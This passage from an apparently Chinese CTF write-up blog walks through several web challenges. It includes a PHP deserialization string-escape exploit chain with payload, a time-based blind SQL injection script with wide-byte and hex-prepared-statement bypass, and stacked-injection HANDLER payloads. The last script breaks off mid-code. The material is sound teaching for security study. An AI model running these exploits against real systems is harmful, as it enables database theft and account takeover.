class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset="utf-8"&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'login'</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"你还没有登陆呢！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>大意就是获取admin的密码登入就可以拿到flag。主要审计是lib.php</p>
<p>当时审的时候没有注意到<code>__toString</code>这个魔法方法，快结束的时候才注意到。主要还是太菜了</p>
<p>____toString:在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 <a href="http://php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a> 或 <a href="http://php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a> 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 <a href="http://php.net/manual/zh/function.printf.php" target="_blank" rel="noopener">printf()</a>，使用 <em>%s</em> 修饰符），但不能用于非字符串环境（如使用 <em>%d</em> 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 <code>E_RECOVERABLE_ERROR</code> 级别的错误。</p>
<p>index.php是注入不了的。只能在update.php想办法</p>
<p>user.php中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br></pre></td></tr></table></figure>

<p>去查看user类的update方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里有unserialize函数，且$this-&gt;getNewinfo()可控，存在序列化漏洞</p>
<p>跳转到getNewinfo方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跳转到Info类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果$this-&gt;CtrlCase是dbCtrl类的实例魔法方法__call可以调用到dbCtrl::logon（）</p>
<p>且在User::getNewInfo方法中调用了一个safe过滤函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br></pre></td></tr></table></figure>

<p>存在序列化字符串逃逸漏洞</p>
<p>执行完后，回到User::update方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跳转到UpdateHelper类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果$this-&gt;sql是一个类对象会触发User::__toString方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有update方法的只有dbCtrl类，但是Info类中有一个魔法调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果让User类中的$this-&gt;nickname为dbCtrl类的实例就调用到dbCtrl::login方法，而且$sql可控</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>附上脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=<span class="string">'select password,id from user where username=?'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Info();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;nickname=<span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">'admin'</span>;</span><br><span class="line">    <span class="keyword">public</span> $password=<span class="string">'1'</span>;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token=<span class="string">'admin'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test=<span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$a=<span class="keyword">new</span> Info();</span><br><span class="line">$a-&gt;nickname=<span class="string">''</span>;</span><br><span class="line">$a-&gt;CtrlCase=$test;</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="string">'%09'</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";s:0:"</span></span><br><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelper<span class="string">":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>User<span class="string">":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";s:0:"</span><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":8:&#123;s:8:"</span>hostname<span class="string">";s:9:"</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">";s:6:"</span>dbuser<span class="string">";s:4:"</span>root<span class="string">";s:6:"</span>dbpass<span class="string">";s:4:"</span>root<span class="string">";s:8:"</span>database<span class="string">";s:4:"</span>test<span class="string">";s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:8:"</span>password<span class="string">";s:1:"</span><span class="number">1</span><span class="string">";s:6:"</span>mysqli<span class="string">";N;s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>使用相应长度的字符逃逸</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age&#x3D;&amp;nickname&#x3D;******************************************************************************************flagflag&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到MD5，解密，登录即可拿到flag</p>
<h1 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h1><p>打开题目就是源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    function check($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\^|&amp;|database/i'</span>,$str,$matches))</span><br><span class="line">        &#123;</span><br><span class="line">            print_r($matches);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        $db = new PDO(<span class="string">'mysql:host=localhost;dbname=pdotest'</span>,<span class="string">'root'</span>,<span class="string">'******'</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    catch(Exception $e)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(isset($_GET[<span class="string">'id'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $test = $db-&gt;query("select balabala from table1");</span><br><span class="line">        $res = $test-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        $id = $res[<span class="string">'balabala'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(check($id))</span><br><span class="line">    &#123;</span><br><span class="line">        $query = <span class="string">"select balabala from table1 where 1=?"</span>;</span><br><span class="line">        $db-&gt;query("set names gbk");</span><br><span class="line">        $row = $db-&gt;prepare($query);</span><br><span class="line">        $row-&gt;bindParam(1,$id);</span><br><span class="line">        $row-&gt;execute();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>没有能在题目结束之前解出来，后面看到一篇<a href="http://www.52bug.cn/hkjs/6152.html" target="_blank" rel="noopener">文章</a>，之前也看到一篇文章，不过只有上半部分。使用预编译加上16禁止就可以绕过</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://localhost/1.php?id=1%df%27;set%20@x='</span>+payload+<span class="string">';prepare%20a%20from%20@x;EXECUTE%20a;'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    he=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> strs:</span><br><span class="line">        he+=hex(ord(x))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(he)</span></span><br><span class="line">    <span class="keyword">return</span> he</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"select if(ascii(substr((%s),%d,1))&gt;%d,sleep(1),1)"</span> % (s_payload,x, mid)</span><br><span class="line">            payload=str2hex(payload)</span><br><span class="line">            t1=time.time()</span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="comment"># if res.status_code == 404 or res.status_code == 429:</span></span><br><span class="line">            <span class="comment">#     x=x-1</span></span><br><span class="line">            <span class="comment">#     error = 1</span></span><br><span class="line">            <span class="comment">#     break</span></span><br><span class="line">            <span class="comment"># html=res.text</span></span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> time.time()-t1&gt;=<span class="number">1</span>:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">(db)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select group_concat('</span>+columns+<span class="string">') from '</span>+table</span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'flag'</span>,<span class="string">'table1'</span>)</span><br></pre></td></tr></table></figure>







<h1 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h1><p>打开题目是一个提交框，是强网杯 2019随便注改过来的，但是禁止了set，prepare，alter，rename。改表，预处理是不行了。</p>
<p>测试时发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure>

<p>存在堆叠注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1%27||id;show tables;desc words;desc FlagHere;</span><br></pre></td></tr></table></figure>

<p>返回结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag 在FlagHere表中的flag列，经过测试语句应该是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;select data from words where id&#x3D;$_GET[id]&#39;</span><br></pre></td></tr></table></figure>

<p>需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：1&#39;; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#</span><br></pre></td></tr></table></figure>

<p>如果表名是数字需要使用反撇号包裹。</p>
<h1 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h1><p> 是一个提交窗口，经过测试过滤了如下字符0</p>
<p><img src="../pic/111.png" alt=""></p>
<p>后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了</p>
<p><img src="../pic/112.png" alt=""></p>
<p>information_schema.tables可以使用<code>sys.schema_table_statistics_with_buffer</code>或<code>sys.schema_table_statistics_with_buffer</code>代替。</p>
<p>数据使用无列名注入</p>
<p>首先盲注获取数据库名</p>
<p>附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2/24/2020 11:21 AM</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(hexs)</span></span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url=<span class="string">'http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line"></span><br><span class="line">    